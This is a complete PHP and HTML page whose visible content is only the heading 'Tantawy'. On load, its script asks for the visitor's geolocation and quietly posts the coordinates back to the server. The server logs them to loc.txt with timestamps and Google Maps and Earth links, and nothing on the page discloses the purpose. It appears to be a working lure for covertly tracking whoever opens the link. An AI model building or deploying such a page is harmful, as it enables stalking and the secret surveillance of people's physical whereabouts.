<?php
date_default_timezone_set('Africa/Cairo'); 
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $googleMap = "https://www.google.com/maps?q=$latitude,$longitude";
    $googleEarth = "https://earth.google.com/web/search/$latitude,$longitude";
    $timestamp = date("Y-m-d H:i:s");

    $file = 'loc.txt';
    $data = "====================\n";
    $data .= "Timestamp: $timestamp\n";
    $data .= "Latitude: $latitude\nLongitude: $longitude\n";
    $data .= "Google Map: $googleMap\nGoogle Earth: $googleEarth\n";
    $data .= "====================\n\n";

    if (file_put_contents($file, $data, FILE_APPEND) === false) {
        echo "Error writing to file.";
    } else {
        echo "Data written to file successfully!";
    }
    exit;
}
?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <center>
        <h1>Tantawy</h1>
    </center>
    <script>
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            console.log("Latitude: " + latitude + ", Longitude: " + longitude);
            send(latitude, longitude);
        }, function(error) {
            console.log("Error Code: " + error.code);
            console.log("Error Message: " + error.message);
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}


function send(latitude, longitude) {
    const formData = new FormData();
    formData.append('latitude', latitude);
    formData.append('longitude', longitude);
    fetch(window.location.href, {
        method: 'POST',
        body: formData
    }).then(response => response.text()).then(data => {
        console.log("Server response: " + data);
    });
}

window.onload = function() {
    getLocation();
};

</script>

</body>
</html>